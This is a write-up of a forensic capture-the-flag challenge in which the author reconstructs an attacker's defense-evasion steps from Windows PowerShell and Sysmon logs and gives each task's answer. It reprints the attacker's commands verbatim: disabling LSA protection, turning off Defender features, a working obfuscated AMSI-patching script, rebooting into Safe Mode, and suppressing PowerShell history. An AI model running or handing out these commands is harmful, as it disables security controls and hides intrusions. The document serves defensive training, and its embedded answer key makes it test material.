# Operation Blackout 2025: Operation Blackout 2025: Smoke & Mirrors
#### Categories: DFIR <br> Difficulty: Very Easy

## Sherlock Scenario
Byte Doctor Reyes is investigating a stealthy post-breach attack where several expected security logs and Windows Defender alerts appear to be missing. He suspects the attacker employed defense evasion techniques to disable or manipulate security controls, significantly complicating detection efforts.

Using the exported event logs, your objective is to uncover how the attacker compromised the system's defenses to remain undetected.

## Attachments
- `Smoke-and-Mirrors.zip`

## Solve
After downloading and extracting the attachment, I obtained three PowerShell logs: `Microsoft-Windows-Powershell.evtx`, `Microsoft-Windows-Powershell-Operational.evtx`, and `Microsoft-Windows-Sysmon-Operational.evtx`. Using EvtxECmd to parse them to `.csv` format so they can be analyzed using Timeline Explorer or Excel:
```
EvtxECmd.exe -f "Microsoft-Windows-Powershell-Operational.evtx" --csv ".\Output_Folder"
```

<br>

### Task 1
#### Question:
The attacker disabled LSA protection on the compromised host by modifying a registry key. What is the full path of that registry key?

#### Answer:
Searching for the keyword "LSA" reveals Record Numbers 217 and 251 containing commands to disable LSA protection:
``` powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f
```

>[!Note] 
> LSA Protection (Local Security Authority Protection) is a security mechanism designed to protect the `lsass.exe` process (which stores NTLM hashes, clear-text passwords, and Kerberos tickets) from unauthorized memory reads and tampering. When LSA Protection is active, `lsass.exe` runs as a Protected Process Light (PPL), allowing only Windows-signed processes to access and read/write to its memory space.

Answer: **HKLM\SYSTEM\CurrentControlSet\Control\LSA**

<br>

### Task 2
#### Question:
Which PowerShell command did the attacker first execute to disable Windows Defender?

#### Answer:
To disable Windows Defender via PowerShell, attackers typically execute the `Set-MpPreference` cmdlet. Searching for this keyword shows the first command appearing in Record Number 352:

``` powershell
Set-MpPreference -DisableIOAVProtection $true -DisableEmailScanning $true -DisableBlockAtFirstSeen $true
```

Answer: **Set-MpPreference -DisableIOAVProtection $true -DisableEmailScanning $true -DisableBlockAtFirstSeen $true**

<br>

### Task 3
#### Question:
The attacker loaded an AMSI patch written in PowerShell. Which function in the DLL is being patched by the script to effectively disable AMSI?

#### Answer:
My initial attempt to search for the keyword `amsi` returned no results. Instead, I searched for the API function `GetModuleHandle`, as modifying exported functions in `amsi.dll` requires retrieving the library's base address first. This query revealed Record Numbers 616 and 642. The script used string concatenation to evade plain-text keyword detection. The function targeted and patched by the script is `AmsiScanBuffer`:

``` powershell
ScriptBlockText: function Disable-Protection {
     $k = @"
 using System;
 using System.Runtime.InteropServices;
 public class P {
     [DllImport("kernel32.dll")]
     public static extern IntPtr GetProcAddress(IntPtr hModule
 string procName);
     [DllImport("kernel32.dll")]
     public static extern IntPtr GetModuleHandle(string lpModuleName);
     [DllImport("kernel32.dll")]
     public static extern bool VirtualProtect(IntPtr lpAddress
 UIntPtr dwSize
 uint flNewProtect
 out uint lpflOldProtect);
     public static bool Patch() {
         IntPtr h = GetModuleHandle("a" + "m" + "s" + "i" + ".dll");
         if (h == IntPtr.Zero) return false;
         IntPtr a = GetProcAddress(h
 "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r");
         if (a == IntPtr.Zero) return false;
         UInt32 oldProtect;
         if (!VirtualProtect(a
 (UIntPtr)5
 0x40
 out oldProtect)) return false;
         byte[] patch = { 0x31
 0xC0
 0xC3 };
         Marshal.Copy(patch
 0
 a
 patch.Length);
         return VirtualProtect(a
 (UIntPtr)5
 oldProtect
 out oldProtect);
     }
 }
 "@
     Add-Type -TypeDefinition $k
     $result = [P]::Patch()
     if ($result) {
         Write-Output "Protection Disabled"
     } else {
         Write-Output "Failed to Disable Protection"
     }
 }
```

>[!Note] 
> AMSI (Antimalware Scan Interface) is an interface standard that allows applications to integrate with the installed antivirus solution. It helps counter fileless malware and script obfuscation by analyzing decoded scripts in memory before execution and passing buffers to the security provider for signature matching and behavioral inspection.

Answer: **AmsiScanBuffer**

<br>

### Task 4
#### Question:
Which command did the attacker use to restart the machine in Safe Mode?

#### Answer:
Searching for the keyword `safeboot` reveals the command in Record Number 673:

``` powershell
bcdedit /set safeboot network
```

>[!Note] 
> Safe Mode is a diagnostic environment in Windows designed to boot the operating system with a minimal set of drivers and services. Attackers often exploit this mode to bypass, disable, or downgrade third-party security agents, EDR solutions, and native protections like Defender or LSA Protection before proceeding with their payload execution.

Answer: **bcdedit.exe /set safeboot network**


<br>

### Task 5
#### Question:
Which PowerShell command did the attacker use to disable PowerShell command history logging?

#### Answer:
To disable command history logging in PowerShell, the attacker executed the `Set-PSReadLineOption` cmdlet, which can be identified in Record Number 688:
``` powershell
Set-PSReadlineOption -HistorySaveStyle SaveNothing
```

Answer: **Set-PSReadlineOption -HistorySaveStyle SaveNothing**